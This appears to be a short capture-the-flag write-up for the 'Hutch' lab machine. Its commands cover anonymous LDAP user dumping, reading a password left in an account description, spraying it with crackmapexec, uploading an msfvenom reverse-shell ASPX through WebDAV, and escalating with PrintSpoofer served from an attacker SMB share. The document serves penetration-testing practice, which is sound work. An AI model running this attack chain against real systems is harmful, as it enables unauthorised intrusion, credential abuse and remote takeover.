# Hutch

### Enumeration

```
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Date: Thu, 28 Oct 2021 16:28:55 GMT
|   Server Type: Microsoft-IIS/10.0
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
...
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
...
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
...
```

```
$ ldapsearch -x -h 192.168.99.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName:
...
sAMAccountName: rplacidi
sAMAccountName: opatry
sAMAccountName: ltaunton
sAMAccountName: acostello
sAMAccountName: jsparwell
sAMAccountName: oknee
sAMAccountName: jmckendry
sAMAccountName: avictoria
sAMAccountName: jfrarey
sAMAccountName: eaburrow
sAMAccountName: cluddy
sAMAccountName: agitthouse
sAMAccountName: fmcsorley
```

We created a list. It contains above usernames.

```
$ ldapsearch -x -h 192.168.99.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description
...
description: Password set to [REDACTED] at user's request. Please c
```

```
$ crackmapexec smb 192.168.99.122 -u users.txt -p [REDACTED]
SMB         192.168.99.122  445    HUTCHDC          [+] hutch.offsec\fmcsorley:[REDACTED]
```

### Initial Access

We have a valid credential and there is a webdav enabled web service.

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.99 LPORT=80 -f aspx -o shell.aspx
$ curl -T 'shell.aspx' 'http://192.168.99.122/' -u fmcsorley:[REDACTED]
```

### PrivEsc

SeImpersonatePrivilege - Enabled

PrintSpoofer.exe - [https://github.com/dievus/printspoofer](https://github.com/dievus/printspoofer)

smbserver.py - [https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py)

```
$ python smbserver.py share smb
```

```
C:\>\\192.168.49.99\share\PrintSpoofer.exe -i -c cmd

C:\Windows\system32>
```
